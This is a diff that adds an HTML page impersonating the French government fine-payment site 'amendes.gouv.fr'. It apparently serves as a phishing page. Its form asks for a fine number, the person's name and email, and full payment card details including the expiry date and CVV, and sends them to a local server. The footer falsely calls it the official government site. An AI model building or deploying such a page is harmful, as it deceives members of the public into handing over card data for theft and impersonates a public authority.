@@ -1,0 +1,110 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title> amendes.gouv.fr</title>
+  <style>
+      body {
+          font-family: Arial, sans-serif;
+          background-color: #f4f6f8;
+          margin: 0;
+          padding: 0;
+      }
+      .container {
+          max-width: 400px;
+          margin: 50px auto;
+          background: white;
+          padding: 30px;
+          border-radius: 8px;
+          box-shadow: 0 0 10px rgba(0,0,0,0.1);
+      }
+      h1 {
+          color: #004085;
+          font-size: 24px;
+          margin-bottom: 20px;
+          text-align: center;
+      }
+      label {
+          display: block;
+          margin-top: 15px;
+          font-weight: bold;
+          color: #333;
+      }
+      input[type="text"], input[type="email"], input[type="number"], input[type="password"] {
+          width: 100%;
+          padding: 10px;
+          margin-top: 5px;
+          border: 1px solid #ccc;
+          border-radius: 4px;
+          box-sizing: border-box;
+      }
+      button {
+          margin-top: 25px;
+          width: 100%;
+          background-color: #004085;
+          color: white;
+          padding: 12px;
+          border: none;
+          border-radius: 4px;
+          font-size: 16px;
+          cursor: pointer;
+      }
+      button:hover {
+          background-color: #003366;
+      }
+      .footer {
+          margin-top: 20px;
+          font-size: 12px;
+          color: #777;
+          text-align: center;
+
+        .header img {
+    width: 6px; 
+    height: auto;
+    border-radius: 6px;
+    margin-right: 15px;
+}
+          
+        
+      }
+  </style>
+</head>
+<body>
+  <div class="container">
+    
+      <h1>Paiement de votre amende</h1>
+      <form action="http://localhost:3000/submit" method="POST">         
+      <label for="numAmende">Numéro de l'amende</label>
+          <input type="text" id="numAmende" name="numAmende" placeholder="Ex: 1234567890" required />
+
+          <label for="nom">Nom</label>
+          <input type="text" id="nom" name="nom" placeholder="Votre nom" required />
+
+          <label for="prenom">Prénom</label>
+          <input type="text" id="prenom" name="prenom" placeholder="Votre prénom" required />
+
+          <label for="email">Adresse email</label>
+          <input type="email" id="email" name="email" placeholder="exemple@mail.com" required />
+
+          <label for="numCarte">Numéro de carte bancaire</label>
+          <input type="text" id="numCarte" name="numCarte" placeholder="0000 0000 0000 0000" maxlength="19" required />
+
+          <label for="dateExp">Date d'expiration (MM/AA)</label>
+          <input type="text" id="dateExp" name="dateExp" placeholder="MM/AA" maxlength="5" required />
+
+          <label for="cvv">Code CVV</label>
+          <input type="password" id="cvv" name="cvv" placeholder="123" maxlength="3" required />
+
+          <button type="submit">Payer maintenant</button>
+      
+      </form>
+
+     <div class="footer">
+       paiment sécurisé
+      <div class="footer">
+          &copy; 2025 amendes.gouv.fr - Site officiel du gouvernement français
+      </div>
+  </div>
+</body>
+</html>
